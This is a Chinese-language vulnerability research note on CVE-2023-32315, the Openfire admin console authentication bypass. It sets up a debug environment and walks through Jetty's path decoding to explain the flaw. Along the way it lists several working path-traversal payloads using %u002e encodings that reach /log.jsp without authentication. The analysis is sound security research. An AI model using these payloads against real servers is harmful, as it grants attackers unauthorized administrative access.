
参考：
- https://github.com/vulhub/vulhub/blob/master/openfire/CVE-2023-32315/README.zh-cn.md

### 环境搭建

```bash
wget https://github.com/igniterealtime/Openfire/releases/download/v4.7.3/openfire_4_7_3.tar.gz
tar zxf openfire_4_7_3.tar.gz
cd bin
chmod +x ./openfire.sh
./openfire.sh start -debug
```
即可监听在5005端口进行调试。

payload:
```
/setup/setup-/../../log.jsp
```

![image](https://github.com/shadowsock5/Poc/assets/30398606/2e63de08-0853-49cb-b267-e050b57f7ce6)
说明到这里的时候，不能有`%2e`。
将`../../`进行unicode编码，得到：
```
/setup/setup-/\u002E\u002E/\u002E\u002E/log.jsp
```

![image](https://github.com/shadowsock5/Poc/assets/30398606/d3db00ec-f5c3-41d4-8648-ca43b14a4d83)

虽然能过认证，但是响应是这样的：
![image](https://github.com/shadowsock5/Poc/assets/30398606/ddd0cd28-6882-455e-bc6f-b5da33a34023)

直接抄答案，
```
/setup/setup-/%u002E%u002E/%u002E%u002E/log.jsp
```
绕过了。
![image](https://github.com/shadowsock5/Poc/assets/30398606/e7615e3e-f554-4c39-a058-46cc2c97ed4a)

调试看一下为什么？

注意这里的log.jsp并不是真的存在这个文件，而是在web.xml中有其映射的servlet。
```xml
    <servlet>
        <servlet-name>org.jivesoftware.openfire.admin.log_jsp</servlet-name>
        <servlet-class>org.jivesoftware.openfire.admin.log_jsp</servlet-class>
    </servlet>
...
    <servlet-mapping>
        <servlet-name>org.jivesoftware.openfire.admin.log_jsp</servlet-name>
        <url-pattern>/log.jsp</url-pattern>
    </servlet-mapping>
```

在这里下断点：
org.jivesoftware.openfire.admin.log_jsp#_jspService

![image](https://github.com/shadowsock5/Poc/assets/30398606/e7811e9d-0332-4242-94c9-ca1cb518afad)
断下来之后往前回溯。
![image](https://github.com/shadowsock5/Poc/assets/30398606/7ae5ced4-59e4-40f0-a618-46db5ac750fe)

openfire\lib\jetty-servlet-9.4.43.v20210629.jar!\org\eclipse\jetty\servlet\ServletHolder.class# handle


在这里
openfire\lib\jetty-http-9.4.43.v20210629.jar!\org\eclipse\jetty\http\HttpURI.class
看到了：
```java

    static {
        __ambiguousSegments.put(".", Boolean.FALSE);
        __ambiguousSegments.put("%2e", Boolean.TRUE);
        __ambiguousSegments.put("%u002e", Boolean.TRUE);
        __ambiguousSegments.put("..", Boolean.FALSE);
        __ambiguousSegments.put(".%2e", Boolean.TRUE);
        __ambiguousSegments.put(".%u002e", Boolean.TRUE);
        __ambiguousSegments.put("%2e.", Boolean.TRUE);
        __ambiguousSegments.put("%2e%2e", Boolean.TRUE);
        __ambiguousSegments.put("%2e%u002e", Boolean.TRUE);
        __ambiguousSegments.put("%u002e.", Boolean.TRUE);
        __ambiguousSegments.put("%u002e%2e", Boolean.TRUE);
        __ambiguousSegments.put("%u002e%u002e", Boolean.TRUE);
    }
```
所以从这里面看，只有不包含`%2e`的，能变成..的应该都可以，比如：
```
/setup/setup-/.%u002e/.%u002e/log.jsp
/setup/setup-/%u002e./%u002e./log.jsp
```

一些细节：
![image](https://github.com/shadowsock5/Poc/assets/30398606/f63dfd7a-6e23-4011-b2eb-3d1e56c534ef)

openfire\lib\jetty-util-9.4.43.v20210629.jar!\org\eclipse\jetty\util\URIUtil.class
![image](https://github.com/shadowsock5/Poc/assets/30398606/e291fb82-1dc0-473e-b059-466d4147709e)

openfire\lib\jetty-http-9.4.43.v20210629.jar!\org\eclipse\jetty\http\HttpURI.class
![image](https://github.com/shadowsock5/Poc/assets/30398606/d83c058a-3a45-4a6d-a2f1-7524af4508ca)
这里的
```java
String decodedNonCanonical = URIUtil.decodePath(this._path)
```
把
```
/setup/setup-/.%u002e/.%u002e/log.jsp
=>
/setup/setup-/../../log.jsp
```
然后
```java
this._decodedPath = URIUtil.canonicalPath(decodedNonCanonical)
```
把
```
/setup/setup-/../../log.jsp
=>
/log.jsp
```

这样在这里，
openfire\lib\jetty-server-9.4.43.v20210629.jar!\org\eclipse\jetty\server\HttpChannelOverHttp.class

![image](https://github.com/shadowsock5/Poc/assets/30398606/64f6a262-7743-4320-b199-fdfb98a811ec)

已经被转换成了`/log.jsp`。


## Ref
- https://mp.weixin.qq.com/s/cuULlP0F0Xf9Rhmkb-9H0g
- https://mp.weixin.qq.com/s/EzfB8CM4y4aNtKFJqSOM1w
- https://github.com/igniterealtime/Openfire/security/advisories/GHSA-gw42-f939-fhvm
